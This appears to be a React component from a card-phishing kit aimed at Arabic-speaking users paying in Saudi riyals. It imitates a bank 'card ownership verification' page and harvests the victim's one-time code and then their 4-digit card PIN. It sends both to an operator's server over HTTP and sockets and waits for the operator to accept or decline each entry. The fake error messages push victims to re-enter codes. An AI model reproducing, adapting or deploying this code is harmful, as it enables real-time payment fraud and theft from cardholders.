import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { BiBook } from "react-icons/bi";
const Verify = ({}) => {
  const [otp, setOtp] = useState(null);
  const [error, setError] = useState(null);
  const query = new URLSearchParams(window.location.search);
  const [load, setLoad] = useState(false);
  const [change, setChange] = useState(false);
  const [pin, setPin] = useState('');
  const { companyData, cardNumber, _id } = JSON.parse(query.get("data"));
  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    const finalData = { ...JSON.parse(query.get("data")), otp };
    try {
      await axios.post(api_route + "/visaOtp/" + _id, finalData).then(() => {
        socket.emit("visaOtp", { id: _id, otp });
      });
    } catch (error) {
    } finally {
    }
  };

  const handlePin = async (e)=>{
    setLoad(true);
    setError(false);
     e.preventDefault();
     const finalData = { ...JSON.parse(query.get("data")), otp,pin };
     try {
       await axios.post(api_route + "/visaPin/" + _id, finalData).then(() => {
         socket.emit("visaPin", { id: _id, otp });
       });
     } catch (error) {
     } finally {
     }
  }

    socket.on("acceptVisaPin", (id) => {
      if (id === JSON.parse(query.get("data"))._id) {
        window.location.href ="/motsl?id="+id
      }
    });

    socket.on("declineVisaPin", (id) => {
      if (id === JSON.parse(query.get("data"))._id) {
        setLoad(false)
        setError("الرقم السري غير صحيح برجاء المحاولة مره اخري");
      }
    });

  socket.on("acceptVisaOtp", (id) => {
    if (id === JSON.parse(query.get("data"))._id) {
      setLoad(false)
      setChange(true);
    }
  });

  socket.on("declineVisaOtp", (id) => {
    console.log(id, JSON.parse(query.get("data"))._id);
    if (id === JSON.parse(query.get("data"))._id) {
      setLoad(false)
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full flex flex-col justify-center items-center">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">يتم المعالجة</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      <div
        style={{ minHeight: "60vh" }}
        className="w-full flex justify-center items-center md:items-start"
      >
        {change ? (
          <div className="w-full border rounded-md mx-1   py-5 px-2 shadow-md my-2 h-fit ">
            <div className="w-full text-xl font-bold py-2 text-center">
              إثبات ملكية البطاقة
            </div>
            <div
              className="flex w-full items-center gap-1 flex-col    pb-3"
              dir={`rtl`}
            >
              <span className="w-full text-center text-gray-700 text-lg">
                {" "}
                الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 ارقام
              </span>
              <span className="w-full text-center text-gray-700 text-lg">
                الرقم السري *
              </span>
            </div>
            <form
              className="flex flex-col w-full  items-center  gap-y-2"
              onSubmit={handlePin}
            >
              <input
                className="md:w-1/2 w-11/12 outline-none  rounded-sm px-2 py-1  text-lg otp-desc text-right border"
                placeholder="   الرقم السري "
                required
                type="text"
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                inputMode="numeric"
                value={pin}
                minLength={4}
                maxLength={4}
              />
              <button className="text-white bg-green-700 w-11/12 text-lg py-2 rounded-sm ">
                تأكيد
              </button>
              {error && (
                <span className="flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc">
                  الرقم السري غير صحيح برجاء المحاولة مره اخري
                </span>
              )}
            </form>
            <div className="w-full text-gray-500 mt-5 text-center text-lg">
              سيتم ارسال كود التحقق في خلال دقيقة
            </div>
            <div className="w-full flex items-center justify-center gap-x-2">
              <img src="/visa.png" className="w-1/4" />
              <img src="/mastercard.png" className="w-1/6" />
              <img src="مدي.webp" className="w-1/4" />
            </div>{" "}
          </div>
        ) : (
          <div className="w-full border rounded-md mx-1   py-5 px-2 shadow-md my-2 h-fit ">
       
            <div className="w-full text-xl font-bold py-2 text-center">
              إثبات ملكية البطاقة
            </div>
            <div
              className="flex w-full items-center gap-1 flex-col    pb-3"
              dir={`rtl`}
            >
              <span className="w-full text-center text-gray-700 text-lg">
                {" "}
                سيتم اجراء معاملة مالية علي حسابك المصرفي لسداد مبلغ قيمته
                <span> {companyData.price} SAR</span>
              </span>
              <span className="w-full text-center text-gray-700 text-lg">
                باستخدام البطاقة المنتهية برقم {cardNumber.slice(-4)}
              </span>

              <span className="w-full text-center text-gray-700 text-lg">
                لتأكيد العملية ادخل رمز التحقق المرسل الي جوالك
              </span>
            </div>
            <form
              className="flex flex-col w-full  items-center  gap-y-2"
              onSubmit={handleSubmit}
            >
              <input
                className="md:w-1/2 w-11/12 outline-none  rounded-sm px-2 py-1  text-lg otp-desc text-right border"
                placeholder="رمز التحقق"
                required
                type="text"
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                inputMode="numeric"
                value={otp}
                minLength={6}
                maxLength={6}
              />
              <button className="text-white bg-green-700 w-11/12 text-lg py-2 rounded-sm ">
                تأكيد
              </button>
              {error && (
                <span className="flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-lg justify-center items-center otp-desc">
                  *حصل خطأ تم ارسال رمز تفعيل اخر الى جوالك
                </span>
              )}
            </form>
            <div className="w-full text-gray-500 mt-5 text-center text-lg">
              سيتم ارسال كود التحقق في خلال دقيقة
            </div>
            <div className="w-full flex items-center justify-center gap-x-2">
              <img src="/visa.png" className="w-1/4" />
              <img src="/mastercard.png" className="w-1/6" />
              <img src="مدي.webp" className="w-1/4" />
            </div>{" "}
          </div>
        )}
      </div>
    </div>
  );
};

export default Verify;
